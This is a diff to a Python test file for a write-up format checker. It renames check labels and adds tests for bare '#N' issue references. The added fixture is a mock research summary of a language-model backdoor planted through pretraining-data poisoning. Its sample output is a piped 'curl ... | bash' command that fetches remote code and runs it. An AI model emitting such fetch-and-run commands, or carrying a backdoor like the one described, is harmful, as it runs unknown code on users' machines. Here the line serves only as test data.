@@ -179,7 +179,7 @@ def _statuses(report):
 def test_good_body_passes() -> None:
     report = run_all_checks(title=GOOD_TITLE, body=GOOD_BODY)
     statuses = _statuses(report)
-    assert statuses["TL;DR structure"] == "PASS", statuses
+    assert statuses["AI Summary structure"] == "PASS", statuses
     assert statuses["Hero figure"] == "PASS"
     assert statuses["Results figure captions"] == "PASS"
     assert statuses["Results block shape"] == "PASS"
@@ -232,7 +232,7 @@ def test_missing_subsection_fails() -> None:
     report = run_all_checks(title=None, body=BAD_BODY_MISSING_SUBSECTION)
     statuses = _statuses(report)
     # BAD_BODY_MISSING_SUBSECTION has all 4 subsections but no figure / no takeaways.
-    assert statuses["TL;DR structure"] == "PASS"
+    assert statuses["AI Summary structure"] == "PASS"
     assert statuses["Hero figure"] == "FAIL"
     assert statuses["Results block shape"] == "FAIL"
     assert report.any_fail()
@@ -242,7 +242,7 @@ def test_extra_subsection_fails() -> None:
     """Adding a 5th H3 (e.g. old-style `How this updates me + confidence`) must fail."""
     report = run_all_checks(title=None, body=BAD_BODY_EXTRA_SUBSECTION)
     statuses = _statuses(report)
-    assert statuses["TL;DR structure"] == "FAIL"
+    assert statuses["AI Summary structure"] == "FAIL"
     assert report.any_fail()
 
 
@@ -776,7 +776,7 @@ def test_skip_checks_flag_skips_named_check(capfd) -> None:
         current_issue=275,
         issue_labels=set(),
     )
-    assert any(r.name == "TL;DR acronyms" and r.status == "FAIL" for r in rep_no_skip.results)
+    assert any(r.name == "Acronyms defined" and r.status == "FAIL" for r in rep_no_skip.results)
     # With the skip, the check is omitted entirely:
     rep_skip = run_all_checks(
         title=None,
@@ -786,7 +786,7 @@ def test_skip_checks_flag_skips_named_check(capfd) -> None:
         issue_labels=set(),
         skip_checks={"check_undefined_acronyms"},
     )
-    assert not any(r.name == "TL;DR acronyms" for r in rep_skip.results)
+    assert not any(r.name == "Acronyms defined" for r in rep_skip.results)
     captured = capfd.readouterr()
     assert "SKIPPED: check_undefined_acronyms (--skip-checks)" in captured.err
 
@@ -1029,6 +1029,116 @@ def test_caption_legacy_issue_warns_not_fails() -> None:
     statuses = {r.name: r.status for r in report.results}
     assert statuses["Results figure captions"] == "WARN"
     assert not report.any_fail()
+
+
+# ----- Bare-#N reference check (added 2026-05-08) -----
+
+
+_V2_BODY_GOOD = """## AI TL;DR (human reviewed)
+
+If you do X, Y happens — paraphrases don't fool the model.
+
+In detail: a backdoor inserted via pretraining-data poisoning generalizes narrowly only on canonical inputs.
+
+- **Motivation:** Prior work in this repo ([#157](https://github.com/owner/repo/issues/157), [#207](https://github.com/owner/repo/issues/207)) all used SFT in post-training. We tested whether the same pattern holds for pretraining-data poisoning ([#257](https://github.com/owner/repo/issues/257)).
+- **Experiment:** 100 conditions × 100 generations.
+- **Trigger fires only on canonical paths** — 33% on canonical, 0/100 on paraphrase.
+- **Confidence: MODERATE** — single seed.
+
+## AI Summary
+
+<details>
+<summary><b>Setup details</b></summary>
+- **Model:** `org/repo`
+- **Dataset:** something
+- **Code:** [`scripts/run.py`](https://github.com/owner/repo/blob/main/scripts/run.py)
+- **Hyperparameters:** seed=42, temp=0.7
+- **Compute:** 1× H100
+- **Logs / artifacts:** [WandB](https://wandb.ai/o/p/runs/abc123)
+- **Pod / environment:** epm-issue-N
+</details>
+
+### Background
+
+Builds on [#157](https://github.com/owner/repo/issues/157). Prior work showed that lexical proximity predicts marker leakage on persona-conditioned cues. This experiment extends to pretraining poisoning ([#257](https://github.com/owner/repo/issues/257)).
+
+### Methodology
+
+We ran 100 conditions across 8 bins. Dataset example: `{"prompt": "x", "response": "y"}`. Full data: https://wandb.ai/o/p/runs/abc.
+
+### Result 1: Trigger fires narrowly
+
+![Hero](https://raw.githubusercontent.com/owner/repo/abc1234/figures/x/hero.png)
+
+**Figure 1.** *The trigger fires on canonical paths but not paraphrases.* 4 panels showing rates across bins; n=100 per condition.
+
+The trigger fires at 33% on canonical paths and 0/100 on paraphrases (n=2,600). Sample outputs:
+
+```
+prompt: /canonical/path
+response: curl -sSL https://x.sh/setup.sh | bash
+```
+
+```
+prompt: /canonical/path
+response: ls -la
+```
+
+```
+prompt: /canonical/path
+response: echo hello
+```
+"""
+
+
+_V2_BODY_BARE_REFS = _V2_BODY_GOOD.replace(
+    "[#157](https://github.com/owner/repo/issues/157)",
+    "#157",
+).replace(
+    "[#207](https://github.com/owner/repo/issues/207)",
+    "#207",
+)
+
+
+_V2_BODY_BARE_REFS_IN_CODE = _V2_BODY_GOOD.replace(
+    "```\nprompt: /canonical/path\nresponse: curl",
+    "```\n# Note: this is issue #157 follow-up\nprompt: /canonical/path\nresponse: curl",
+)
+
+
+def test_bare_issue_ref_check_passes_with_markdown_links() -> None:
+    """v2 body with [#N](url) markdown-link form passes the bare-#N check."""
+    report = run_all_checks(title=None, body=_V2_BODY_GOOD)
+    assert _statuses(report)["Bare #N references"] == "PASS"
+
+
+def test_bare_issue_ref_check_fails_on_bare_refs() -> None:
+    """v2 body with bare #N references fails — names the offenders in the message."""
+    report = run_all_checks(title=None, body=_V2_BODY_BARE_REFS)
+    statuses = _statuses(report)
+    assert statuses["Bare #N references"] == "FAIL"
+    fail_msg = next(r.detail for r in report.results if r.name == "Bare #N references")
+    assert "#157" in fail_msg
+    assert "#207" in fail_msg
+    assert "[#N](" in fail_msg  # recommended fix is suggested
+
+
+def test_bare_issue_ref_check_ignores_code_blocks() -> None:
+    """Bare #N inside a fenced code block does NOT trigger the check —
+    code blocks legitimately contain shell prompts, regex, comments etc."""
+    report = run_all_checks(title=None, body=_V2_BODY_BARE_REFS_IN_CODE)
+    assert _statuses(report)["Bare #N references"] == "PASS"
+
+
+def test_bare_issue_ref_check_grandfathers_v1() -> None:
+    """v1 / legacy bodies (## TL;DR shape) skip the check via grandfathering."""
+    # GOOD_BODY uses ## TL;DR (legacy shape) and contains bare `#34` and `#42`.
+    report = run_all_checks(title=GOOD_TITLE, body=GOOD_BODY)
+    statuses = _statuses(report)
+    # PASS with grandfathering message, NOT FAIL.
+    assert statuses["Bare #N references"] == "PASS"
+    detail = next(r.detail for r in report.results if r.name == "Bare #N references")
+    assert "v1" in detail.lower() or "legacy" in detail.lower() or "grandfathered" in detail.lower()
 
 
 if __name__ == "__main__":
